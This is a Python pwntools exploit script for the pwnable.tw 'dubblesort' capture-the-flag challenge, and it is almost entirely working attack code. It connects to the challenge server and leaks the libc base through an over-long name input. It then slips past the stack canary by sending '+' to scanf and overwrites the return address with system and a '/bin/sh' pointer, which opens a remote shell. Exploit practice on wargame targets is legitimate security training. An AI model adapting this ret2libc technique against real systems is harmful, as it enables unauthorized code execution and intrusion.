#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

libc = ELF('./libc_32.so.6')

r = remote('chall.pwnable.tw', 10101)
#r = process("./dubblesort", env = {"LD_PRELOAD": "./libc_32.so.6"})
#gdb.attach(proc.pidof(r)[0])

# leak libc base address
r.sendafter('What your name :', 'A' * (6 * 4 + 1))
result = r.recv()
libc.address = u32(b'\x00' + result[6:].strip(b'A')[:3]) - 0x1b0000
print("libc address:", hex(libc.address))

offset = 32
number = offset + 5
binsh = 0x158e8b

r.sendline(str(number)) # array length

for i in range(number):
    if i < 24: r.sendlineafter('number : ', "0")
    elif i == 24: r.sendlineafter('number : ', "+")
    elif i < 32: r.sendlineafter('number : ', str(libc.address))
    elif i == 32: r.sendlineafter('number : ', str(libc.symbols[b'system']))
    else: r.sendlineafter('number : ', str(libc.address + binsh))

r.interactive()
